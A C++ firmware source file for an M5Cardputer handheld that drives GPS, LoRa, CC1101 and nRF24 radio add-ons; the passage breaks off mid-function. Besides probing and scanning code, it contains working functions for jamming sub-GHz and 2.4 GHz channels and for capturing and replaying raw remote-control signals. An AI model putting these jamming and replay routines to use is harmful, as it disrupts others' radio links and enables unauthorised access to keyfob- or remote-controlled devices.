#include "hardware.h"

#include <Arduino.h>
#include <M5Cardputer.h>
#include <SPI.h>
#include <TinyGPSPlus.h>

namespace {

HardwareProfile g_profile = HardwareProfile::Auto;
SPISettings kRfSpiSettings(1000000, MSBFIRST, SPI_MODE0);
HardwareSerial g_gpsSerial(2);
TinyGPSPlus g_tinyGps;
bool g_gpsSerialStarted = false;
constexpr uint32_t kGpsBaudOptions[] = {115200, 9600, 38400};
constexpr int kGpsBaudCount = sizeof(kGpsBaudOptions) / sizeof(kGpsBaudOptions[0]);
int g_gpsBaudIndex = 0;
uint32_t g_gpsLastByteMs = 0;
uint32_t g_gpsSerialStartMs = 0;

constexpr HardwarePins kPins = {
    40, 39, 14, 12,  // Shared SPI + SD
    13, 15,          // GPS TX/RX
    3, 6, 4, 5,      // LoRa RST/BUSY/DIO1/NSS(CS)
    13, 5,           // CC1101 CS / GDO0
    6, 4,            // nRF24 CSN / CE
};

static bool probeLoraGpsCapPresent() {
  // loraBusy (GPIO4) and loraDio1 (GPIO6) are shared with nrf24Ce/nrf24Csn which
  // hardwareInit() already configured as OUTPUTs. Reconfigure as inputs so we can
  // actually read the SX1262's signals instead of our own output levels.
  pinMode(kPins.loraBusy, INPUT_PULLDOWN);
  pinMode(kPins.loraDio1, INPUT_PULLDOWN);
  delay(2);

  digitalWrite(kPins.loraRst, LOW);
  delay(3);
  while (digitalRead(kPins.loraBusy) == HIGH) delay(1);
  digitalWrite(kPins.loraRst, HIGH);
  bool found = false;
  for (int i = 0; i < 30; ++i) {
    if (digitalRead(kPins.loraBusy) == HIGH || digitalRead(kPins.loraDio1) == HIGH) {
      found = true;
      break;
    }
    delay(1);
  }
  if (!found) digitalWrite(kPins.loraRst, LOW);
  return found;
}

uint8_t cc1101ReadStatusReg(uint8_t reg) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(reg | 0xC0);
  const uint8_t value = SPI.transfer(0x00);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
  return value;
}

uint8_t cc1101ReadConfigReg(uint8_t reg) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(reg | 0x80);
  const uint8_t value = SPI.transfer(0x00);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
  return value;
}

void cc1101WriteReg(uint8_t reg, uint8_t value) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(reg);
  SPI.transfer(value);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
}

uint8_t cc1101Strobe(uint8_t strobe) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  const uint8_t state = SPI.transfer(strobe);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
  return state;
}

uint8_t nrf24ReadReg(uint8_t reg, uint8_t* statusOut = nullptr) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  const uint8_t status = SPI.transfer(reg & 0x1F);
  const uint8_t value = SPI.transfer(0xFF);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
  if (statusOut) *statusOut = status;
  return value;
}

void nrf24WriteReg(uint8_t reg, uint8_t value) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  SPI.transfer(0x20 | (reg & 0x1F));
  SPI.transfer(value);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
}

uint8_t nrf24Command(uint8_t command) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  const uint8_t status = SPI.transfer(command);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
  return status;
}

static uint32_t cc1101FreqWord(int bandMHz) {
  switch (bandMHz) {
    case 315: return 0x0C1D89;
    case 868: return 0x21656A;
    case 915: return 0x23313B;
    default:  return 0x10A762;
  }
}

static void cc1101ReadFifo(uint8_t* buf, uint8_t n) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(0xFF);  // burst read RX FIFO
  for (uint8_t i = 0; i < n; ++i) buf[i] = SPI.transfer(0x00);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
}

static void cc1101WriteFifoBurst(const uint8_t* buf, uint8_t n) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(0x7F);  // burst write TX FIFO
  for (uint8_t i = 0; i < n; ++i) SPI.transfer(buf[i]);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
}

static void nrf24WriteFifoBurst(const uint8_t* buf, uint8_t n) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  SPI.transfer(0xA0);  // W_TX_PAYLOAD
  for (uint8_t i = 0; i < n; ++i) SPI.transfer(buf[i]);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
}

}  // namespace

static void ensureGpsSerialStarted() {
  if (g_gpsSerialStarted) return;
  // begin(baud, config, rxPin, txPin): GPS module TX feeds ESP32 RX (gpsRx=15),
  // GPS RX receives from ESP32 TX (gpsTx=13).
  g_gpsSerial.begin(kGpsBaudOptions[g_gpsBaudIndex], SERIAL_8N1, kPins.gpsRx, kPins.gpsTx);
  g_gpsSerialStarted = true;
  g_gpsSerialStartMs = millis();
  g_gpsLastByteMs = 0;
}

static void restartGpsSerialAtNextBaud() {
  if (g_gpsSerialStarted) {
    g_gpsSerial.end();
  }
  g_tinyGps = TinyGPSPlus();
  g_gpsBaudIndex = (g_gpsBaudIndex + 1) % kGpsBaudCount;
  g_gpsSerialStarted = false;
  ensureGpsSerialStarted();
}

void hardwareInit() {
  g_profile = HardwareProfile::Auto;

  // Park shared expansion hats in safe idle states before any app touches them.
  // Mirrors the stable CardputerOS approach to avoid warm-boot glitches with hats attached.
  pinMode(kPins.gpsTx, OUTPUT);
  digitalWrite(kPins.gpsTx, HIGH);
  pinMode(kPins.gpsRx, INPUT_PULLUP);

  pinMode(kPins.loraRst, OUTPUT);
  digitalWrite(kPins.loraRst, LOW);
  pinMode(kPins.loraBusy, INPUT_PULLDOWN);
  pinMode(kPins.loraDio1, INPUT_PULLDOWN);

  pinMode(kPins.cc1101Cs, OUTPUT);
  digitalWrite(kPins.cc1101Cs, HIGH);
  pinMode(kPins.cc1101Gdo0, INPUT_PULLDOWN);

  pinMode(kPins.nrf24Csn, OUTPUT);
  digitalWrite(kPins.nrf24Csn, HIGH);
  pinMode(kPins.nrf24Ce, OUTPUT);
  digitalWrite(kPins.nrf24Ce, LOW);

  // Deselect SX1262 (loraSpiCs=GPIO7) before SPI init — it shares the bus with SD.
  // If left floating/LOW it will participate in SPI transactions and corrupt SD.
  pinMode(kPins.loraSpiCs, OUTPUT);
  digitalWrite(kPins.loraSpiCs, HIGH);

  SPI.begin(kPins.sdSck, kPins.sdMiso, kPins.sdMosi, kPins.sdCs);
  pinMode(kPins.sdCs, OUTPUT);
  digitalWrite(kPins.sdCs, HIGH);

  // Prefer a stable auto-detect over live profile cycling. If the RF hat
  // answers on SPI, lock to that profile so ghost key input cannot bounce
  // the UI through hardware modes while the hat is attached.
  const Cc1101ProbeResult cc1101 = hardwareProbeCc1101();
  const Nrf24ProbeResult nrf24 = hardwareProbeNrf24();
  if (cc1101.present || nrf24.present) {
    g_profile = HardwareProfile::RfHat;
  } else if (probeLoraGpsCapPresent()) {
    g_profile = HardwareProfile::LoraGpsCap;
  }
  // Always put SX1262 back in reset after probing — it shares the SPI bus with SD
  // and will load/drive MISO while active even with NSS HIGH. Hold it in reset
  // until a LoRa app actually needs it (we have no LoRa app, so it stays off).
  digitalWrite(kPins.loraRst, LOW);
}

HardwareProfile hardwareCurrentProfile() {
  return g_profile;
}

void hardwareNextProfile() {
  // Manual cycling is disabled for now because attached hats can inject
  // noisy keyboard events and cause unwanted profile switching.
}

const char* hardwareProfileName() {
  switch (g_profile) {
    case HardwareProfile::Auto: return "Auto Detect";
    case HardwareProfile::LoraGpsCap: return "LoRa / GPS Cap";
    case HardwareProfile::RfHat: return "CC1101 / nRF24 Hat";
  }
  return "Auto Detect";
}

const char* hardwareProfileShortName() {
  switch (g_profile) {
    case HardwareProfile::Auto: return "AUTO";
    case HardwareProfile::LoraGpsCap: return "LORA";
    case HardwareProfile::RfHat: return "RF";
  }
  return "AUTO";
}

const char* hardwareProfileHint() {
  switch (g_profile) {
    case HardwareProfile::Auto:
      return "Shared SPI ready";
    case HardwareProfile::LoraGpsCap:
      return "GPS13/15 LoRa 3/4/6";
    case HardwareProfile::RfHat:
      return "CC13/G5 nRF6/4";
  }
  return "";
}

const HardwarePins& hardwarePins() {
  return kPins;
}

bool hardwareProfileSupportsApp(AppId appId) {
  switch (appId) {
    case AppId::Cc1101Ops:
    case AppId::Nrf24Ops:
    case AppId::Cc1101Scan:
    case AppId::NrfAnalyzer:
      return g_profile == HardwareProfile::Auto || g_profile == HardwareProfile::RfHat;
    default:
      return true;
  }
}

const char* hardwareAppRequirement(AppId appId) {
  switch (appId) {
    case AppId::GpsMonitor:
      return "Needs GPS cap: TX=G13 RX=G15";
    case AppId::Cc1101Ops:
    case AppId::Cc1101Scan:
      return "Needs RF hat: CC1101 CS=G13 GDO0=G5";
    case AppId::Nrf24Ops:
    case AppId::NrfAnalyzer:
      return "Needs RF hat: nRF24 CSN=G6 CE=G4";
    default:
      return "";
  }
}

bool hardwareGpsUpdate() {
  ensureGpsSerialStarted();
  bool updated = false;
  while (g_gpsSerial.available() > 0) {
    g_gpsLastByteMs = millis();
    if (g_tinyGps.encode(static_cast<char>(g_gpsSerial.read()))) {
      updated = true;
    }
  }
  const uint32_t now = millis();
  if (!g_tinyGps.location.isValid() &&
      now - g_gpsSerialStartMs > 1800 &&
      (g_gpsLastByteMs == 0 || now - g_gpsLastByteMs > 1800)) {
    restartGpsSerialAtNextBaud();
  }
  return updated;
}

GpsFix hardwareGpsGetFix() {
  GpsFix fix{};
  fix.serialReady = g_gpsSerialStarted;
  fix.valid = g_tinyGps.location.isValid();
  fix.hasDateTime = g_tinyGps.date.isValid() && g_tinyGps.time.isValid();
  fix.satellites = g_tinyGps.satellites.isValid() ? static_cast<int>(g_tinyGps.satellites.value()) : 0;
  fix.latitude = g_tinyGps.location.isValid() ? g_tinyGps.location.lat() : 0.0;
  fix.longitude = g_tinyGps.location.isValid() ? g_tinyGps.location.lng() : 0.0;
  fix.altitudeMeters = g_tinyGps.altitude.isValid() ? g_tinyGps.altitude.meters() : 0.0;
  fix.speedKmph = g_tinyGps.speed.isValid() ? g_tinyGps.speed.kmph() : 0.0;
  fix.courseDeg = g_tinyGps.course.isValid() ? g_tinyGps.course.deg() : 0.0;
  fix.ageMs = g_tinyGps.location.isValid() ? g_tinyGps.location.age() : 0xFFFFFFFFUL;

  if (g_tinyGps.time.isValid()) {
    snprintf(fix.timeText, sizeof(fix.timeText), "%02d:%02d:%02d",
             g_tinyGps.time.hour(), g_tinyGps.time.minute(), g_tinyGps.time.second());
  } else {
    snprintf(fix.timeText, sizeof(fix.timeText), "--:--:--");
  }

  if (g_tinyGps.date.isValid()) {
    snprintf(fix.dateText, sizeof(fix.dateText), "%04d-%02d-%02d",
             g_tinyGps.date.year(), g_tinyGps.date.month(), g_tinyGps.date.day());
  } else {
    snprintf(fix.dateText, sizeof(fix.dateText), "---- -- --");
  }
  return fix;
}

Cc1101ProbeResult hardwareProbeCc1101() {
  Cc1101ProbeResult result = {false, 0xFF, 0xFF, digitalRead(kPins.cc1101Gdo0), 0xFF, 0xFF, 0xFF, 0xFF, -127};
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) {
    return result;
  }

  pinMode(kPins.cc1101Cs, OUTPUT);
  digitalWrite(kPins.cc1101Cs, HIGH);
  pinMode(kPins.cc1101Gdo0, INPUT_PULLDOWN);
  delay(2);

  result.partnum = cc1101ReadStatusReg(0x30);
  result.version = cc1101ReadStatusReg(0x31);
  result.gdo0 = digitalRead(kPins.cc1101Gdo0);
  result.present = (result.partnum != 0x00 && result.partnum != 0xFF) ||
                   (result.version != 0x00 && result.version != 0xFF);
  return result;
}

Nrf24ProbeResult hardwareProbeNrf24() {
  Nrf24ProbeResult result = {false, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0, digitalRead(kPins.nrf24Ce)};
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) {
    return result;
  }

  pinMode(kPins.nrf24Csn, OUTPUT);
  digitalWrite(kPins.nrf24Csn, HIGH);
  pinMode(kPins.nrf24Ce, OUTPUT);
  digitalWrite(kPins.nrf24Ce, LOW);
  delay(2);

  result.setupAw = nrf24ReadReg(0x03, &result.status);
  result.rfCh = nrf24ReadReg(0x05);
  result.rfSetup = nrf24ReadReg(0x06);
  const bool setupLooksValid = result.setupAw >= 0x01 && result.setupAw <= 0x03;
  const bool channelLooksValid = result.rfCh <= 125;
  const bool setupNotBlank = result.rfSetup != 0x00 && result.rfSetup != 0xFF;
  result.present = setupLooksValid && channelLooksValid && setupNotBlank;
  return result;
}

Cc1101ProbeResult hardwarePollCc1101(int bandMHz, int sensitivity) {
  Cc1101ProbeResult result = hardwareProbeCc1101();
  if (!result.present) return result;

  uint32_t freqWord = 0;
  switch (bandMHz) {
    case 315: freqWord = 0x0C1D89; break;
    case 433: freqWord = 0x10A762; break;
    case 868: freqWord = 0x21656A; break;
    case 915: freqWord = 0x23313B; break;
    default: freqWord = 0x10A762; break;
  }

  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3A);  // SFRX
  cc1101WriteReg(0x02, 0x06);  // IOCFG0
  cc1101WriteReg(0x08, 0x32);  // PKTCTRL0
  cc1101WriteReg(0x0B, 0x06);  // FSCTRL1
  cc1101WriteReg(0x0D, (freqWord >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (freqWord >> 8) & 0xFF);
  cc1101WriteReg(0x0F, freqWord & 0xFF);
  cc1101WriteReg(0x10, sensitivity >= 4 ? 0xCA : 0x8B);  // MDMCFG4
  cc1101WriteReg(0x11, 0x83);  // MDMCFG3
  cc1101WriteReg(0x12, 0x13);  // MDMCFG2
  cc1101WriteReg(0x18, 0x18);  // MCSM0 autocal
  cc1101Strobe(0x33);          // SCAL
  delay(2);
  cc1101Strobe(0x34);          // SRX
  delay(8);

  result.partnum = cc1101ReadStatusReg(0x30);
  result.version = cc1101ReadStatusReg(0x31);
  result.lqi = cc1101ReadStatusReg(0x33);
  const uint8_t rawRssi = cc1101ReadStatusReg(0x34);
  result.marcState = cc1101ReadStatusReg(0x35) & 0x1F;
  result.pktStatus = cc1101ReadConfigReg(0x38);
  result.rxBytes = cc1101ReadStatusReg(0x3B) & 0x7F;
  result.gdo0 = digitalRead(kPins.cc1101Gdo0);
  result.rssiDbm = (rawRssi >= 128) ? (((int)rawRssi - 256) / 2 - 74) : ((int)rawRssi / 2 - 74);
  return result;
}

Nrf24ProbeResult hardwarePollNrf24(int channel, int density) {
  Nrf24ProbeResult result = hardwareProbeNrf24();
  if (!result.present) return result;

  const uint8_t clampedChannel = channel < 0 ? 0 : (channel > 125 ? 125 : channel);
  const uint8_t rfSetup = density >= 4 ? 0x0F : (density >= 2 ? 0x07 : 0x03);

  nrf24WriteReg(0x00, 0x0B);       // CONFIG: PWR_UP, PRIM_RX, CRC
  nrf24WriteReg(0x01, 0x00);       // EN_AA off
  nrf24WriteReg(0x02, 0x01);       // EN_RXADDR P0
  nrf24WriteReg(0x03, 0x03);       // 5-byte address
  nrf24WriteReg(0x04, 0x00);       // no retry
  nrf24WriteReg(0x05, clampedChannel);
  nrf24WriteReg(0x06, rfSetup);
  nrf24Command(0xE2);              // FLUSH_RX
  digitalWrite(kPins.nrf24Ce, HIGH);
  delay(3);

  result.status = nrf24Command(0xFF);
  result.setupAw = nrf24ReadReg(0x03);
  result.rfCh = nrf24ReadReg(0x05);
  result.rfSetup = nrf24ReadReg(0x06);
  result.observeTx = nrf24ReadReg(0x08);
  result.fifoStatus = nrf24ReadReg(0x17);
  result.rpdHits = 0;
  result.sampleCount = density + 2;
  for (uint8_t i = 0; i < result.sampleCount; ++i) {
    delay(2);
    result.rpdHits += (nrf24ReadReg(0x09) & 0x01) ? 1 : 0;
  }
  digitalWrite(kPins.nrf24Ce, LOW);
  result.ce = digitalRead(kPins.nrf24Ce);
  return result;
}

int hardwareCc1101ReadRssiAtFreq(float mhz, int sensitivity) {
  Cc1101ProbeResult probe = hardwareProbeCc1101();
  if (!probe.present) return -127;

  const uint32_t freqWord = static_cast<uint32_t>((mhz * 65536.0f) / 26.0f);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3A);  // SFRX
  cc1101WriteReg(0x02, 0x06);  // IOCFG0
  cc1101WriteReg(0x08, 0x32);  // PKTCTRL0
  cc1101WriteReg(0x0B, 0x06);  // FSCTRL1
  cc1101WriteReg(0x0D, (freqWord >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (freqWord >> 8) & 0xFF);
  cc1101WriteReg(0x0F, freqWord & 0xFF);
  cc1101WriteReg(0x10, sensitivity >= 4 ? 0xCA : 0x8B);  // MDMCFG4
  cc1101WriteReg(0x11, 0x83);  // MDMCFG3
  cc1101WriteReg(0x12, 0x13);  // MDMCFG2
  cc1101WriteReg(0x18, 0x18);  // MCSM0 autocal
  cc1101Strobe(0x33);          // SCAL
  delay(2);
  cc1101Strobe(0x34);          // SRX
  delay(2);

  const uint8_t rawRssi = cc1101ReadStatusReg(0x34);
  return (rawRssi >= 128) ? (((int)rawRssi - 256) / 2 - 74) : ((int)rawRssi / 2 - 74);
}

void hardwareCc1101StartCwJam(int bandMHz) {
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return;
  const uint32_t f = cc1101FreqWord(bandMHz);
  cc1101Strobe(0x36);  // SIDLE
  delay(2);
  cc1101Strobe(0x3B);  // SFTX
  cc1101WriteReg(0x06, 0x3D);  // PKTLEN: 61
  cc1101WriteReg(0x08, 0x00);  // PKTCTRL0: fixed, no CRC, no whitening
  cc1101WriteReg(0x0B, 0x06);  // FSCTRL1
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  cc1101WriteReg(0x10, 0x8B);  // MDMCFG4: ~4.8kbps
  cc1101WriteReg(0x11, 0x83);  // MDMCFG3
  cc1101WriteReg(0x12, 0x30);  // MDMCFG2: 2-FSK, no sync word check
  cc1101WriteReg(0x16, 0x30);  // MCSM1: TXOFF=IDLE
  cc1101WriteReg(0x18, 0x18);  // MCSM0: autocal on IDLE→TX
  cc1101Strobe(0x33);  // SCAL
  delay(3);
}

void hardwareCc1101SendJamBurst(int bandMHz) {
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return;
  const uint32_t f = cc1101FreqWord(bandMHz);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  uint8_t jam[61];
  for (int i = 0; i < 61; ++i) jam[i] = (i & 1) ? 0xAA : 0x55;
  cc1101WriteFifoBurst(jam, 61);
  cc1101Strobe(0x35);  // STX
}

void hardwareCc1101StopJam() {
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX flush
}

bool hardwareCc1101TryCapturePacket(int bandMHz, Cc1101RxCapture& out) {
  out.valid = false;
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return false;
  const uint32_t f = cc1101FreqWord(bandMHz);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3A);  // SFRX
  cc1101WriteReg(0x02, 0x06);  // IOCFG0: assert when sync word sent/received
  cc1101WriteReg(0x06, 0xFF);  // PKTLEN: max
  cc1101WriteReg(0x08, 0x05);  // PKTCTRL0: variable length, no CRC
  cc1101WriteReg(0x0B, 0x06);  // FSCTRL1
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  cc1101WriteReg(0x10, 0xC8);  // MDMCFG4: wide BW for best catch rate
  cc1101WriteReg(0x11, 0x83);  // MDMCFG3
  cc1101WriteReg(0x12, 0x13);  // MDMCFG2: 2-FSK, 16-bit sync word
  cc1101WriteReg(0x18, 0x18);  // MCSM0
  cc1101Strobe(0x33);  // SCAL
  delay(2);
  cc1101Strobe(0x34);  // SRX
  const uint32_t deadline = millis() + 500;
  while (millis() < deadline) {
    if (digitalRead(kPins.cc1101Gdo0)) {
      delay(2);
      const uint8_t rxBytes = cc1101ReadStatusReg(0x3B) & 0x7F;
      if (rxBytes >= 1 && rxBytes <= 64) {
        out.len = rxBytes;
        cc1101ReadFifo(out.data, out.len);
        const uint8_t rawRssi = cc1101ReadStatusReg(0x34);
        out.rssiDbm = (rawRssi >= 128) ? (((int)rawRssi - 256) / 2 - 74) : ((int)rawRssi / 2 - 74);
        out.lqi = cc1101ReadStatusReg(0x33) & 0x7F;
        out.valid = true;
        cc1101Strobe(0x36);
        return true;
      }
    }
    delay(5);
  }
  cc1101Strobe(0x36);
  return false;
}

void hardwareCc1101Replay(const Cc1101RxCapture& pkt, int bandMHz) {
  if (!pkt.valid || pkt.len == 0) return;
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return;
  const uint32_t f = cc1101FreqWord(bandMHz);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX
  cc1101WriteReg(0x06, pkt.len);
  cc1101WriteReg(0x08, 0x00);  // fixed, no CRC
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  cc1101WriteReg(0x10, 0x8B);
  cc1101WriteReg(0x11, 0x83);
  cc1101WriteReg(0x12, 0x30);  // no sync word (raw replay)
  cc1101WriteReg(0x16, 0x30);  // TXOFF=IDLE
  cc1101WriteReg(0x18, 0x18);
  cc1101WriteFifoBurst(pkt.data, pkt.len);
  cc1101Strobe(0x33);  // SCAL
  delay(2);
  cc1101Strobe(0x35);  // STX
  delay(50);
  cc1101Strobe(0x36);  // back to IDLE after TX
}

static void cc1101WritePatable(uint8_t p0, uint8_t p1);  // defined later in OOK section

bool hardwareCc1101CaptureRaw(int bandMHz, Cc1101RawCapture& out, int timeoutMs) {
  out.valid = false;
  out.count = 0;
  out.freqMHz = bandMHz;
  out.rssiDbm = -127;
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return false;

  const uint32_t f = cc1101FreqWord(bandMHz);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3A);  // SFRX
  // Async serial RX — OOK, no sync word; GDO0 outputs demodulated signal
  cc1101WriteReg(0x02, 0x0D);  // IOCFG0: async serial data out
  cc1101WriteReg(0x08, 0x32);  // PKTCTRL0: async serial, infinite
  cc1101WriteReg(0x0B, 0x06);  // FSCTRL1
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  cc1101WriteReg(0x10, 0xC7);  // MDMCFG4: BW=325kHz, captures most ISM remotes
  cc1101WriteReg(0x11, 0x83);  // MDMCFG3: ~4.8kbps symbol rate
  cc1101WriteReg(0x12, 0x03);  // MDMCFG2: OOK modulation, no preamble/sync
  cc1101WriteReg(0x18, 0x18);  // MCSM0: autocal
  cc1101Strobe(0x33);          // SCAL
  delay(2);
  cc1101Strobe(0x34);          // SRX
  delay(120);                  // wait for AGC to settle before watching for signal

  const int pin = kPins.cc1101Gdo0;
  // If GDO0 is already HIGH (noise/interference), wait for it to go LOW first
  if (digitalRead(pin) == HIGH) {
    const uint32_t noiseWait = millis() + 600;
    while (digitalRead(pin) == HIGH) {
      if (millis() > noiseWait) { cc1101Strobe(0x36); return false; }
    }
  }

  // Now wait for a real signal (GDO0 goes HIGH)
  const uint32_t deadline = millis() + (uint32_t)timeoutMs;
  while (digitalRead(pin) == LOW) {
    if (millis() > deadline) { cc1101Strobe(0x36); return false; }
  }

  const uint8_t rawRssi = cc1101ReadStatusReg(0x34);
  out.rssiDbm = (rawRssi >= 128) ? (((int)rawRssi - 256) / 2 - 74) : ((int)rawRssi / 2 - 74);

  // Reject weak signals that are likely noise
  if (out.rssiDbm < -85) { cc1101Strobe(0x36); return false; }

  // Record alternating HIGH/LOW pulse widths; GDO0 is currently HIGH
  bool active = HIGH;
  while (out.count < kCc1101RawMaxPulses) {
    const uint32_t t = micros();
    while ((bool)digitalRead(pin) == active) {
      if (micros() - t > 50000) goto captureEnd;  // 50ms silence = burst ended
    }
    const uint32_t w = micros() - t;
    out.pulses[out.count++] = (uint16_t)(w > 65535u ? 65535u : w);
    active = !active;
  }
captureEnd:
  cc1101Strobe(0x36);
  // Require meaningful capture: at least 20 transitions and 8ms total duration
  uint32_t totalUs = 0;
  for (int i = 0; i < out.count; ++i) totalUs += out.pulses[i];
  out.valid = (out.count >= 20) && (totalUs >= 8000);
  return out.valid;
}

void hardwareCc1101ReplayRaw(const Cc1101RawCapture& cap) {
  if (!cap.valid || cap.count == 0) return;
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return;

  const int band = cap.freqMHz > 0 ? cap.freqMHz : 433;
  const uint32_t f = cc1101FreqWord(band);
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX
  // OOK async TX — GDO0 becomes the MCU-driven data input
  cc1101WriteReg(0x02, 0x0B);  // IOCFG0: serial clock (safe in async TX)
  cc1101WriteReg(0x08, 0x32);  // PKTCTRL0: async serial mode
  cc1101WriteReg(0x0D, (f >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (f >> 8) & 0xFF);
  cc1101WriteReg(0x0F, f & 0xFF);
  cc1101WriteReg(0x10, 0xC7);
  cc1101WriteReg(0x11, 0x83);
  cc1101WriteReg(0x12, 0x03);  // MDMCFG2: OOK, no sync
  cc1101WriteReg(0x18, 0x18);
  cc1101WriteReg(0x22, 0x11);  // FREND0: PA_POWER index 1 for OOK '1'
  cc1101WritePatable(0x00, 0xC0);  // PA[0]=off, PA[1]=max power
  cc1101Strobe(0x33);  // SCAL
  delay(2);

  const int pin = kPins.cc1101Gdo0;
  digitalWrite(pin, LOW);
  pinMode(pin, OUTPUT);
  cc1101Strobe(0x35);  // STX
  delayMicroseconds(500);

  for (int i = 0; i < cap.count; ++i) {
    digitalWrite(pin, (i % 2 == 0) ? HIGH : LOW);
    delayMicroseconds(cap.pulses[i]);
  }
  digitalWrite(pin, LOW);
  delay(2);
  cc1101Strobe(0x36);
  pinMode(pin, INPUT_PULLDOWN);
}

void hardwareNrf24StartJam(int channel) {
  const uint8_t ch = channel < 0 ? 0 : (channel > 125 ? 125 : (uint8_t)channel);
  nrf24WriteReg(0x00, 0x0A);  // CONFIG: PWR_UP, PRIM_TX
  nrf24WriteReg(0x01, 0x00);  // EN_AA: off
  nrf24WriteReg(0x02, 0x01);  // EN_RXADDR: P0
  nrf24WriteReg(0x03, 0x03);  // AW: 5-byte address
  nrf24WriteReg(0x04, 0x00);  // SETUP_RETR: no retry
  nrf24WriteReg(0x05, ch);
  nrf24WriteReg(0x06, 0x0F);  // RF_SETUP: 2Mbps, max power
  nrf24Command(0xE1);          // FLUSH_TX
  delay(2);
}

void hardwareNrf24SendJamBurst(int channel) {
  const uint8_t ch = channel < 0 ? 0 : (channel > 125 ? 125 : (uint8_t)channel);
  nrf24WriteReg(0x05, ch);
  nrf24Command(0xE1);  // FLUSH_TX
  uint8_t jam[32];
  for (int i = 0; i < 32; ++i) jam[i] = 0x55;
  nrf24WriteFifoBurst(jam, 32);
  digitalWrite(kPins.nrf24Ce, HIGH);
  delayMicroseconds(15);
  digitalWrite(kPins.nrf24Ce, LOW);
  delay(2);
  nrf24WriteReg(0x07, 0x70);  // clear STATUS flags
}

void hardwareNrf24StopJam() {
  digitalWrite(kPins.nrf24Ce, LOW);
  nrf24Command(0xE1);  // FLUSH_TX
  nrf24WriteReg(0x00, 0x00);  // PWR_DOWN
}

void hardwareNrf24FullSweepScan(uint8_t results[126]) {
  for (int i = 0; i < 126; ++i) results[i] = 0;
  nrf24WriteReg(0x00, 0x0B);  // CONFIG: PWR_UP, PRIM_RX
  nrf24WriteReg(0x01, 0x00);  // EN_AA off
  nrf24WriteReg(0x06, 0x07);  // RF_SETUP: 1Mbps
  for (int pass = 0; pass < 3; ++pass) {
    for (int ch = 0; ch < 126; ++ch) {
      nrf24WriteReg(0x05, (uint8_t)ch);
      nrf24Command(0xE2);  // FLUSH_RX
      digitalWrite(kPins.nrf24Ce, HIGH);
      delayMicroseconds(500);
      if (nrf24ReadReg(0x09) & 0x01) results[ch]++;
      digitalWrite(kPins.nrf24Ce, LOW);
    }
  }
  nrf24WriteReg(0x00, 0x00);  // PWR_DOWN
  digitalWrite(kPins.nrf24Ce, LOW);
}

// Write 3-byte address to nRF24 RX_ADDR_P0
static void nrf24WriteAddr3(uint8_t reg, uint8_t b0, uint8_t b1, uint8_t b2) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
